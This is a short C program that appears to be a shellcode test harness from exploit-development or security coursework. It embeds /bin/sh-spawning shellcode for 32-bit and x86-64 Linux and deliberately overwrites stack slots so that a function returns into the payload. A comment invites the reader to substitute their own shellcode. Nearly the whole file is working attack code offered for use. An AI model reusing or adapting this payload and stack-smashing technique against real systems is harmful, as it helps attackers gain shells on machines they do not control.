#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;


//char shellcode[] = "\xeb\x09\x5b\xb0\x0b\x31\xc9\x89\xca\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";
//char shellcode[]="\xeb\x05\x5f\xb0\x3b\x0f\x05\xe8\xf6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";
char shellcode[]="\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
  //Replace the above shellcode buffer of NOP operations with the hex code for you shell code.
  //NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
 long long *ret;
 
 hold= (long long *)&ret;
 (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;

}

void main ()
{  
  int pagesize;
  char *buf;
  
  pagesize = sysconf(_SC_PAGE_SIZE);
  posix_memalign(&buf, pagesize, strlen(shellcode)+10);
  strcpy(buf,shellcode);
  //mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
  decoy(buf);  
  return;  
}



	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
